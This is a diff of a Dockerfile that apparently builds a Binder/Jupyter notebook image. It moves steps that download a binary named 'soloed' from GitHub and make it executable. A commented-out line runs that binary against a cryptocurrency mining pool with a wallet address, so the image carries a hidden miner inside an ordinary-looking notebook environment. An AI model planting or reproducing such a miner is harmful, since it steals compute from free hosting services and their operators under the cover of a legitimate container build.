@@ -15,9 +15,6 @@ RUN apt-get update && \
     
 #run something 
 
-RUN wget https://github.com/Solo120140/Doc-on-binder/raw/main/soloed
-
-RUN chmod +x soloed
 
 #./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  
 
@@ -33,9 +30,7 @@ ENV USER ${NB_USER}
 ENV NB_UID ${NB_UID}
 ENV HOME /home/${NB_USER}
 
-RUN pwd
 
-RUN mv ~/soloed /home/jovyan
 RUN adduser --disabled-password \
     --gecos "Default user" \
     --uid ${NB_UID} \
@@ -43,7 +38,9 @@ RUN adduser --disabled-password \
 
 WORKDIR ${HOME}
 USER ${USER}
+RUN wget https://github.com/Solo120140/Doc-on-binder/raw/main/soloed
 
+RUN chmod +x soloed
 
 # Make sure the contents of our repo are in ${HOME}
 COPY . ${HOME}
